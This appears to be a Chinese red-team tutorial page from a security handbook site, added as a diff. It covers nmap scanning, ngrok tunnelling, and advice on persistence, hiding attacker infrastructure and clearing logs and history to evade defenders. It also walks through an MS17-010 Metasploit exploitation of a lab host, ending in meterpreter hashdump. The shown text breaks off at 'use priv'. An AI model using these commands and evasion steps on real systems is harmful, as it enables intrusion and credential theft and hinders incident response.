@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RedTeam - 红队 | 烟雨黑帽</title>
+<meta name="description" content="渗透测试和红队的区别 常用命令 信息探测 端口扫描 # Namp各种扫描方式的参数 - TCP: -sT - SYN: -sS - ACK: -sA - UDP: -sU - RPC: -sR - ICMP: -sP - Disable Port Scan: -sn # 扫描10000端口、操作系统…">
+<meta name="keywords" content="RedTeam, 红队, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="TesterCC">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="RedTeam">
+<meta property="og:description" content="渗透测试和红队的区别 常用命令 信息探测 端口扫描 # Namp各种扫描方式的参数 - TCP: -sT - SYN: -sS - ACK: -sA - UDP: -sU - RPC: -sR - ICMP: -sP - Disable Port Scan: -sn # 扫描10000端口、操作系统…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="RedTeam">
+<meta name="twitter:description" content="渗透测试和红队的区别 常用命令 信息探测 端口扫描 # Namp各种扫描方式的参数 - TCP: -sT - SYN: -sS - ACK: -sA - UDP: -sU - RPC: -sR - ICMP: -sP - Disable Port Scan: -sn # 扫描10000端口、操作系统…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "红队"}]}, {"@type": "TechArticle", "headline": "RedTeam", "description": "渗透测试和红队的区别 常用命令 信息探测 端口扫描 # Namp各种扫描方式的参数 - TCP: -sT - SYN: -sS - ACK: -sA - UDP: -sU - RPC: -sR - ICMP: -sP - Disable Port Scan: -sn # 扫描10000端口、操作系统…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "TesterCC"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11", "alternativeHeadline": "红队"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1 active"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>红队</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>红队</h1><p class="cn-title">RedTeam</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#_1">渗透测试和红队的区别</a>
+</li>
+<li><a href="#_2">常用命令</a>
+<ul>
+<li><a href="#_3">信息探测</a>
+<ul>
+<li><a href="#_4">端口扫描</a>
+</li>
+</ul>
+</li>
+<li><a href="#_5">文件上传</a>
+</li>
+<li><a href="#_6">内网渗透代理</a>
+<ul>
+<li><a href="#_7">隐秘隧道搭建</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#_8">红队基础设施建设</a>
+<ul>
+<li><a href="#_9">红队自动化平台</a>
+</li>
+<li><a href="#c2">红队C2框架</a>
+</li>
+</ul>
+</li>
+<li><a href="#_10">红队攻防</a>
+<ul>
+<li><a href="#_11">权限维持</a>
+</li>
+</ul>
+</li>
+<li><a href="#_12">常规漏洞利用</a>
+<ul>
+<li><a href="#ms17-010">ms17-010</a>
+<ul>
+<li><a href="#meterpreter">常用的meterpreter命令</a>
+</li>
+</ul>
+</li>
+<li><a href="#smb">smb枚举</a>
+</li>
+<li><a href="#cve-2020-0796-rce">CVE-2020-0796 RCE</a>
+</li>
+</ul>
+</li>
+<li><a href="#centos7">CentOS7提权</a>
+</li>
+<li><a href="#ref">REF</a>
+</li>
+</ul>
+</div>
+</details><div class="article-body">
+<h2 id="_1">渗透测试和红队的区别</h2>
+<p><img alt="pentest_vs_redteam" src="../images/5fbdb594843ddbb7.png" /></p>
+<h2 id="_2">常用命令</h2>
+<h3 id="_3">信息探测</h3>
+<h4 id="_4">端口扫描</h4>
+<pre><code class="language-shell"># Namp各种扫描方式的参数
+- TCP: -sT
+- SYN: -sS
+- ACK: -sA
+- UDP: -sU
+- RPC: -sR
+- ICMP: -sP
+- Disable Port Scan: -sn
+
+# 扫描10000端口、操作系统、版本
+nmap -T4 -A 10.0.4.146
+
+# 默认单位秒，也可指定为毫秒，为1000ms
+nmap -T4 -A 10.0.4.146 --scan-delay 1.1
+
+# 半开扫描
+# 需要root/Administrator权限执行，-sS：半开放扫描（非3次握手的tcp扫描）
+# 优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机不会把连接记入系统日志。防止对方判断为扫描行为，扫描速度快，效率高，在工作中使用频率最高。
+nmap -sS -p 1-65535 10.0.4.146 --open
+
+# 版本探测  等待时间长
+nmap -sV 10.0.4.146
+
+# 操作系统探测
+nmap -O 10.0.4.146
+
+# 其它参数
+--host-timeout  主机超时时间
+--scan-delay  报文时间间隔，单位秒，常用值 1 
+-S &lt;src_ip&gt;  定义扫描源地址，为了降低被发现的概率
+
+# 其它示例
+# 随机选择 1000 台主机扫描是否运行Web服务器（80端口）。
+nmap -v -iR 1000 -P0 -p 80
+</code></pre>
+<h3 id="_5">文件上传</h3>
+<p>在自己的攻击机如Kali上利用Python开 HTTP Server，让被攻击机从攻击机Kali上下载各种工具。完成后即可撤销。</p>
+<ul>
+<li>Python 2 version: <code>python -m SimpleHTTPServer 8000</code></li>
+<li>Python 3 version: <code>python -m http.server 8000</code></li>
+</ul>
+<p>然后在浏览器输入：<code>127.0.0.1:8000</code> 即可访问该路径下的文件了。</p>
+<h3 id="_6">内网渗透代理</h3>
+<h4 id="_7">隐秘隧道搭建</h4>
+<p>1.ngork</p>
+<ul>
+<li>***.com</li>
+<li>***.com</li>
+</ul>
+<p>kali安装ngrok</p>
+<pre><code>1.apt安装
+curl -s ***.com | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc &gt;/dev/null &amp;&amp;
+              echo &quot;deb ***.com buster main&quot; | sudo tee /etc/apt/sources.list.d/ngrok.list &amp;&amp;
+              sudo apt update &amp;&amp; sudo apt install ngrok   
+
+# 网络原因，速度比较慢
+sudo apt install ngrok
+
+2.tgz包安装
+sudo tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
+
+3.初始化
+ngrok config add-authtoken &lt;token&gt;
+
+e.g.
+ngrok config add-authtoken 28xxxxxx........S1z
+Authtoken saved to configuration file: /root/.config/ngrok/ngrok.yml
+
+4.开启隧道
+ngrok http 80
+</code></pre>
+<p>2.FRP</p>
+<h2 id="_8">红队基础设施建设</h2>
+<ul>
+<li>Red-Baron，一个红队自动化部署脚本，但是因为最近都没更新，建议红队开发时参考就好。</li>
+</ul>
+<h3 id="_9">红队自动化平台</h3>
+<p>基本功能：信息收集、信息共享、C2服务、邮件钓鱼、木马免杀等。</p>
+<h3 id="c2">红队C2框架</h3>
+<p>基本功能：模块、载荷、漏洞、隐蔽流量传输等。</p>
+<p>Metasploit满足基本要求，但隐蔽性不足。</p>
+<h2 id="_10">红队攻防</h2>
+<h3 id="_11">权限维持</h3>
+<ul>
+<li>红队实战攻防技术（一）</li>
+</ul>
+<p>红队演练与APT相似的是核心同样在于 “持久化” ，建议还是私钥登录以及创建高权限用户为主。</p>
+<p>可以做一些sudo提权或者SUID文件等操作间接的使用root权限。</p>
+<p>在拿到shell后可以上线到自己C2上，Linux上线CobaltStrike的方式可以使用CrossC2插件进行。</p>
+<p>反弹shell我们一定要用反向代理之类的手段隐匿真实VPS IP，并对Netcat进行流量加密。</p>
+<p>使用nohup的方式留以持续性的代理的方式也比较容易被发现，所以建议使用frp进行代理，也因为它的可拓展性非常高，通过免杀或修改配置文件等方式可以进行躲避流量监测。</p>
+<p>一定要对痕迹进行清理。</p>
+<p>在蓝队处置的过程中，重点关注的对象就是一些登录、服务日志、进程、端口，新建文件，这也是雷区所在，一定要在这些方面下功夫。</p>
+<p>尤其是历史命令，不清理被还原出攻击路径的概率非常大，这也会被一步步揪出来。</p>
+<p>如果能够顺利通过处置人员的排查，那么恭喜你可以安心继续了，因为在非必要或确认失陷的情况，没有甲方愿意去隔离当前业务，尤其是对外服务、内部OA、工控系统等，停止业务系统都可能造成不可估量的损失。</p>
+<p>在进入内网环境下，每一步操作都需要非常的慎重，尤其是涉及端口、进程的操作。因为稍有不慎，被捕获到异常操作，会引起防守方极大的重视。尤其是多次异常告警的情况下，通常在第一次告警的情况下，蓝队成员未排查出异常操作后会对该主机进行重点关注，如果继续出现告警，那么极有可能直接进行单机隔离。</p>
+<p>对于一些新晋红队的同学，风起哥建议首先做好基础建设，比如免杀、隐匿、工具特征改造、匿名VPS、邮箱、手机号、身份信息等，最好在纯净的虚拟机中进行渗透操作（别搁虚拟机里看什么腾讯视频）。如果被蜜罐抓到ID，那么基本上被溯源出来的概率就很高了，你可能还在愉快的渗透着，突然告诉你出局了。</p>
+<h2 id="_12">常规漏洞利用</h2>
+<h3 id="ms17-010">ms17-010</h3>
+<ol>
+<li>内网探测可以利用主机</li>
+</ol>
+<p><code>nmap -n -p445 --script smb-vuln-ms17-010 10.0.4.140/24 --open</code></p>
+<p><img alt="result" src="***.com" /></p>
+<p>虽然扫描速度很快，但可能存在五阿波</p>
+<ol>
+<li>进入msf，通过使用auxiliary/scanner/smb/smb_ms17_010模块进行漏洞扫描（如果通过第0步已经确认可攻击的目标，可以直接到后面第4步对目标发起攻击）</li>
+</ol>
+<pre><code class="language-bash"># msfconsole
+       =[ metasploit v6.0.30-dev                          ]
++ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Enable verbose logging with set VERBOSE 
+true
+
+msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 
+msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options
+</code></pre>
+<p><img alt="options" src="***.com" /></p>
+<ol>
+<li>设置扫描目标的网段，看哪些目标存在漏洞</li>
+</ol>
+<pre><code class="language-bash">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.0.4.0/24
+rhosts =&gt; 10.0.4.0/24
+msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run
+(本人内网测试的时候，扫描速度巨慢，但结果相对精准一些)
+</code></pre>
+<p><img alt="" src="***.com" />
+看结果，只有自己准备的靶机能用，不过检测结果还算精准。</p>
+<ol>
+<li>通过使用<code>exploit/windows/smb/ms17_010_eternalblue</code>模块进行漏洞攻击</li>
+</ol>
+<pre><code class="language-bash">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 10.0.4.147
+rhost =&gt; 10.0.4.147
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+# msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+</code></pre>
+<p><img alt="" src="***.com" /></p>
+<p>看执行结果可知攻击成功，获得session。</p>
+<p><img alt="" src="***.com" /></p>
+<p>win7cmd，消除乱码用<code>chcp 65001</code>命令</p>
+<p>如果直接拿到系统权限，并且没有蓝屏，则可以进行后续渗透工作。比如用meterpreter进行后渗透测试。</p>
+<pre><code>meterpreter是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。
+</code></pre>
+<h4 id="meterpreter">常用的meterpreter命令</h4>
+<pre><code>1. screenshot       # 获取活动用户的桌面截屏保存到相应目录
+
+2. sysinfo          # 获取系统运行的平台
+
+3. run post/windows/gather/hashdump   # 获取靶机上的账户密码哈希值
+</code></pre>
+<pre><code class="language-bash">meterpreter &gt; screenshot
+Screenshot saved to: /root/VFsOPFXE.jpeg
+
+meterpreter &gt; sysinfo
+Computer        : ADMIN-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : zh_CN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+</code></pre>
+<p><img alt="hashdump" src="***.com" /></p>
+<pre><code>Meterpreter跳转，并保持会话
+
+4. background   # 可以跳转到MSF终端里，Meterpreter的会话仍然在运行
+5. sessions -l  # 查看保持的会话连接列表
+6. sessions -i &lt;会话ID&gt;  # 返回对应ID的Meterpreter控制台
+</code></pre>
+<p><img alt="Meterpreter跳转" src="***.com" /></p>
+<pre><code>获取管理员权限
+
+7. use priv  # 加载priv扩展，以便访问某些特权模块
